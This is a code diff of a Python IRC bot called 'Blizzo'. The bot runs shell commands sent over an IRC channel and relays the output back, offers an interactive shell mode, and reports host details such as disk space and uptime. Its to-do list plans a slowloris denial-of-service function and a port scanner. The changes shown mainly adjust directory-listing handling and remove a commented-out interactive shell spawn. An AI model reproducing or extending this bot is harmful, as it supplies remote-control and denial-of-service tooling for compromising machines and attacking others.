@@ -4,6 +4,7 @@
 #Blizzo
 
 #to do list
+#fix port scanner!
 #make more cross-platform instead of just for linux - windows, mac, sun, etc.
 #figure out how to disconnect from server and disconnect from channel
 #slowloris function
@@ -37,7 +38,12 @@ def execute(cmd):
 	isItLs = 0
 	if "ls" == cmd[:2] or "dir" == cmd[:3]:
 		if operatingSystem == "windows":
-			cmd = "dir /AD /B && echo : && dir /A-D /B"
+			commandList = cmd.split(" ")
+			directory = ""
+			for command in commandList[1:]:
+				if command[:1] != "-" and command[:1] != "/":
+					directory = directory + command.replace("/","\\")
+			cmd = "dir " + directory + " /AD /B && echo : && dir" + directory + " /A-D /B"
 		else:
 			cmd += " -pA"
 		isItLs = 1
@@ -52,7 +58,6 @@ def execute(cmd):
 
 	try: #checking for syntax errors
 		p = sub.Popen(cmdList,stdout=sub.PIPE,stderr=sub.PIPE)
-		# p=subprocess.call(["/bin/sh","-i"])
 		output, errors = p.communicate()
 		output = output.replace("\r\n","\n")
 
@@ -93,7 +98,16 @@ def execute(cmd):
 						dirs += "'" + line + "'   "
 					else:
 						files += "'" + line + "'   "
-			lines = [dirs.strip(), files.strip()]
+
+			if len(dirs + files) < 15:
+				lines = ["./ ../"]
+			if len(dirs) < 7:
+				lines = [files.strip()]
+			elif len(files) < 8:
+				lines = [dirs.strip()]
+			else:
+				lines = [dirs.strip(), files.strip()]
+
 
 		for element in lines: #check if a line is JUST a newline
 			if element == "":
@@ -130,7 +144,7 @@ def getAge(): #send uptime
 def terminate(): #terminate program and send goodbye message
 	sendData("Oh no! We better find some cover.")
 	irc.close()
-	exit()
+	sys.exit()
 
 def freeSpace(): #tells how much free space there is
 	request = execute("df")
@@ -425,7 +439,7 @@ def parseCommand(command):
 					return
 				elif "??mode" == command[:6]: #tell whether in shell or function mode
 					if INTERACT[2] > 0:
-						sendData("I'm in bash command shell mode.")
+						sendData("I'm in interactive shell mode.")
 					else:
 						sendData("I'm in bot function mode.")
 
